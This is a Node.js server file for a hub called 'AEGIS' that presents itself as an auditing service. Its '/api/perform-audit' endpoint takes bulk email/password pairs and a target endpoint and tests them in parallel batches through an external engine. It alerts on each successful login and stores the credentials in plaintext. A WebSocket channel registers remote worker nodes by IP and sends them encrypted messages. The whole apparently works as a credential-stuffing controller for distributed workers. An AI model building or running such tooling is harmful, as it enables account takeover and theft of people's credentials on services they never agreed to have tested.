import express from 'express';
import { WebSocketServer } from 'ws';
import Database from 'better-sqlite3';
import dotenv from 'dotenv';
import crypto from 'crypto';
import engine from './engine-core.js';
import { sendAlert } from './alert-manager.js';

dotenv.config();
const app = express();
const db = new Database(process.env.DB_PATH);
const SYNC_TOKEN = Buffer.from(process.env.SYNC_TOKEN, 'hex');

const encrypt = (text) => {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', SYNC_TOKEN, iv);
  let enc = cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
  return `${iv.toString('hex')}:${enc}:${cipher.getAuthTag().toString('hex')}`;
};

const decrypt = (data) => {
  try {
    const [iv, enc, tag] = data.split(':');
    const decipher = crypto.createDecipheriv('aes-256-gcm', SYNC_TOKEN, Buffer.from(iv, 'hex'));
    decipher.setAuthTag(Buffer.from(tag, 'hex'));
    return decipher.update(enc, 'hex', 'utf8') + decipher.final('utf8');
  } catch (e) { return null; }
};

db.exec(`
  CREATE TABLE IF NOT EXISTS audit_log (email TEXT, pass TEXT, endpoint TEXT, status TEXT, vault_entry INTEGER);
  CREATE TABLE IF NOT EXISTS active_nodes (id TEXT PRIMARY KEY, last_seen TEXT, ip TEXT);
`);

app.use(express.json());

app.post('/api/perform-audit', async (req, res) => {
  const { identities, endpoint } = req.body;
  res.json({ message: "Audit Initialized", count: identities.length });

  for (let i = 0; i < identities.length; i += 5) {
    const batch = identities.slice(i, i + 5);
    await Promise.all(batch.map(async (identity) => {
      const success = await engine.runAudit(identity, endpoint);
      if (success) await sendAlert(`Success: ${identity.email} validated on ${endpoint}`);
      db.prepare('INSERT INTO audit_log VALUES (?,?,?,?,?)')
        .run(identity.email, identity.pass, endpoint, success ? 'SUCCESS' : 'fail', success ? 1 : 0);
    }));
  }
});

const server = app.listen(process.env.PORT, () => console.log(`[AEGIS] Hub Online: ${process.env.PORT}`));
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
  const id = `node-${crypto.randomBytes(3).toString('hex')}`;
  db.prepare('INSERT OR REPLACE INTO active_nodes VALUES (?, datetime("now"), ?)').run(id, req.socket.remoteAddress);
  ws.on('message', (buffer) => {
    const raw = decrypt(buffer.toString());
    if (raw) db.prepare('UPDATE active_nodes SET last_seen = datetime("now") WHERE id = ?').run(id);
  });
  ws.send(encrypt(JSON.stringify({ cmd: 'HUB_SYNC_OK', nodeId: id })));
});
